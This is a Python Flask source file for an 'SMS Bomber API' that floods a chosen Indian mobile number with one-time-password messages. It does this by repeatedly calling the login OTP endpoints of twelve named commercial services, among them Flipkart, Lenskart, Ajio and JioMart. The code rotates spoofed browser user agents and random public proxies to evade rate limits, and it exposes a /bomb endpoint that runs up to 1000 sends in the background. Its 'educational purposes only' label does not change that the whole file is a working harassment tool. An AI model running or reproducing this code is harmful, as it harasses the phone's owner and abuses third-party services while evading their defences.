from flask import Flask, request, jsonify
from threading import Thread
import json
import random
import requests
import time

app = Flask(__name__)

class Bomber:
    def __init__(self, user_mobile, number_of_messege):
        self.user_mobile = user_mobile
        self.number_of_messege = number_of_messege
        self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"
    
    def getUserAgent(self):
        user_agent_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
            "Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0",
            "Mozilla/5.0 (Android 9; Mobile; rv:67.0.3) Gecko/67.0.3 Firefox/67.0.3",
            "Mozilla/5.0 (Android 7.1.1; Tablet; rv:67.0) Gecko/67.0 Firefox/67.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.27 Safari/537.36 OPR/62.0.3331.10",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
            "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36"
        ]
        return random.choice(user_agent_list)
    
    def _checkinternet(self):
        try:
            requests.get("https://www.google.com", timeout=5)
            return True
        except:
            return False
    
    def getproxy(self):
        try:
            proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
            proxy_request = requests.get(proxy_scrape_url, timeout=10)
            if proxy_request.status_code == 200:
                proxylist = proxy_request.text.split()
                if proxylist:
                    return {'https': 'https://' + random.choice(proxylist)}
        except:
            pass
        return None
    
    def flipkart(self):
        try:
            url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
            headers = {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": self.acceptlanguage,
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "DNT": "1",
                "Host": "rome.api.flipkart.com",
                "Origin": "https://www.flipkart.com",
                "Referer": "https://www.flipkart.com/",
                "User-Agent": self.getUserAgent()
            }
            data = json.dumps({"loginId": "+91" + self.user_mobile})
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def confirmtkt(self):
        try:
            url = f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={self.user_mobile}&newOtp=true"
            headers = {
                "Accept": "*/*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": self.acceptlanguage,
                "Connection": "keep-alive",
                "DNT": "1",
                "Host": "securedapi.confirmtkt.com",
                "Origin": "https://www.confirmtkt.com",
                "Referer": "https://www.confirmtkt.com/rbooking-d/trips",
                "User-Agent": self.getUserAgent()
            }
            
            proxy = self.getproxy()
            if proxy:
                response = requests.get(url, headers=headers, proxies=proxy, timeout=15)
            else:
                response = requests.get(url, headers=headers, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def lenskart(self):
        try:
            url = "https://api.lenskart.com/v2/customers/sendOtp"
            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "content-type": "application/json;charset=UTF-8",
                "dnt": "1",
                "origin": "https://www.lenskart.com",
                "referer": "https://www.lenskart.com/",
                "user-agent": self.getUserAgent(),
                "x-api-client": "desktop"
            }
            data = json.dumps({"telephone": self.user_mobile})
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def justdial(self):
        try:
            url = "https://www.justdial.com/functions/whatsappverification.php"
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.justdial.com",
                "referer": "https://www.justdial.com/",
                "user-agent": self.getUserAgent(),
                "x-requested-with": "XMLHttpRequest"
            }
            data = f"mob={self.user_mobile}&vcode=&rsend=0&name=deV"
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def indialends(self):
        try:
            url = "https://indialends.com/internal/a/otp.ashx"
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "Connection": "keep-alive",
                "content-type": "application/x-www-form-urlencoded",
                "dnt": "1",
                "Host": "indialends.com",
                "origin": "https://www.indialends.com",
                "referer": "https://www.indialends.com/",
                "user-agent": self.getUserAgent(),
                "x-requested-with": "XMLHttpRequest"
            }
            data = f"log_mode=1&ctrl={self.user_mobile}"
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def apolopharmacy(self):
        try:
            url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "Connection": "keep-alive",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "dnt": "1",
                "origin": "https://www.apollopharmacy.in",
                "referer": "https://www.apollopharmacy.in/",
                "user-agent": self.getUserAgent(),
                "x-requested-with": "XMLHttpRequest"
            }
            data = f"mobile={self.user_mobile}"
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def magicbrick(self):
        try:
            url = "https://accounts.magicbricks.com/userauth/api/validate-mobile"
            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "dnt": "1",
                "origin": "https://accounts.magicbricks.com",
                "referer": "https://accounts.magicbricks.com/userauth/login",
                "user-agent": self.getUserAgent(),
                "x-requested-with": "XMLHttpRequest"
            }
            data = f"ubimobile={self.user_mobile}"
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def ajio(self):
        try:
            url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
            headers = {
                "accept": "application/json",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "Connection": "keep-alive",
                "content-type": "application/json",
                "Host": "login.web.ajio.com",
                "dnt": "1",
                "origin": "https://www.ajio.com",
                "referer": "https://www.ajio.com/",
                "user-agent": self.getUserAgent()
            }
            data = json.dumps({"mobileNumber": self.user_mobile})
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            if response.status_code == 200:
                return response.json().get('success', False)
            return False
        except:
            return False
    
    def mylescars(self):
        try:
            url = "https://www.mylescars.com/usermanagements/chkContact"
            headers = {
                "accept": "application/json",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "dnt": "1",
                "origin": "https://www.mylescars.com",
                "referer": "https://www.mylescars.com/",
                "user-agent": self.getUserAgent(),
                "x-requested-with": "XMLHttpRequest"
            }
            data = f"contactNo={self.user_mobile}"
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def unacademy(self):
        try:
            url = "https://unacademy.com/api/v1/user/get_app_link/"
            headers = {
                "accept": "application/json",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": self.acceptlanguage,
                "Connection": "keep-alive",
                "content-type": "application/json",
                "dnt": "1",
                "origin": "https://unacademy.com",
                "referer": "https://unacademy.com",
                "user-agent": self.getUserAgent()
            }
            data = json.dumps({"phone": self.user_mobile})
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            return response.status_code == 200
        except:
            return False
    
    def snapdeal(self):
        try:
            url = "https://www.snapdeal.com/sendOTP"
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "DNT": "1",
                "Host": "www.snapdeal.com",
                "origin": "https://www.snapdeal.com",
                "referer": "https://www.snapdeal.com/iframeLogin",
                "user-agent": self.getUserAgent(),
                "X-Requested-With": "XMLHttpRequest"
            }
            data = f"emailId=&mobileNumber={self.user_mobile}&purpose=LOGIN_WITH_MOBILE_OTP"
            
            proxy = self.getproxy()
            if proxy:
                response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=15)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=15)
            
            if response.status_code == 200:
                return response.json().get('status') != "fail"
            return False
        except:
            return False
    
    def jiomart(self):
        try:
            url = f"https://www.jiomart.com/mst/rest/v1/id/details/{self.user_mobile}"
            headers = {
                "accept": "application/json, text/plain,*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                "dnt": "1",
                "referer": "https://www.jiomart.com/customer/account/login",
                "user-agent": self.getUserAgent()
            }
            
            proxy = self.getproxy()
            if proxy:
                response = requests.get(url, headers=headers, proxies=proxy, timeout=15)
            else:
                response = requests.get(url, headers=headers, timeout=15)
            
            return response.status_code == 400
        except:
            return False
    
    def startBombing(self):
        if not self._checkinternet():
            print("No internet connection")
            return
        
        print(f"Starting bombing for {self.user_mobile} with {self.number_of_messege} messages")
        
        services = [
            self.flipkart,
            self.confirmtkt,
            self.lenskart,
            self.justdial,
            self.indialends,
            self.apolopharmacy,
            self.magicbrick,
            self.ajio,
            self.mylescars,
            self.unacademy,
            self.snapdeal,
            self.jiomart
        ]
        
        counter = 0
        cycle = 0
        
        while counter < self.number_of_messege:
            cycle += 1
            print(f"Cycle {cycle}: Starting services...")
            
            for i, service in enumerate(services):
                if counter >= self.number_of_messege:
                    break
                
                try:
                    service_name = service.__name__
                    print(f"  Trying {service_name}...")
                    
                    if service():
                        counter += 1
                        print(f"  ✓ Success! Total sent: {counter}/{self.number_of_messege}")
                    else:
                        print(f"  ✗ Failed: {service_name}")
                    
                    time.sleep(0.5)
                    
                except Exception as e:
                    print(f"  ✗ Error in {service.__name__}: {str(e)}")
                    continue
            
            if counter < self.number_of_messege:
                print(f"Completed cycle {cycle}. Waiting 2 seconds...")
                time.sleep(2)
        
        print(f"Bombing completed! Total messages sent: {counter}")

def run_bombing_in_thread(number, noOfMsg):
    try:
        bombobj = Bomber(number, noOfMsg)
        bombobj.startBombing()
    except Exception as e:
        print(f"Error in bombing thread: {str(e)}")

@app.route('/')
def home():
    return jsonify({
        "status": "Welcome to SMS Bomber API",
        "version": "1.0",
        "endpoints": {
            "home": "/",
            "bomb": "/bomb?number=XXXXXXXXXX&noOfMsg=50"
        },
        "note": "For educational purposes only"
    })

@app.route('/bomb')
def bomb():
    number = request.args.get('number', '')
    noOfMsg = request.args.get('noOfMsg', '50')
    
    if not number or len(number) != 10 or not number.isdigit():
        return jsonify({
            "status": "error",
            "message": "Invalid mobile number. Must be 10 digits."
        })
    
    try:
        noOfMsg = int(noOfMsg)
        if noOfMsg <= 0:
            noOfMsg = 50
        elif noOfMsg > 1000:
            noOfMsg = 1000
    except:
        noOfMsg = 50
    
    thread = Thread(target=run_bombing_in_thread, args=(number, noOfMsg))
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "status": "success",
        "message": "Bombing started in background",
        "target": number,
        "messages": noOfMsg,
        "note": "Check server logs for progress"
    })

@app.route('/status')
def status():
    return jsonify({
        "status": "running",
        "service": "SMS Bomber API",
        "ready": True
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
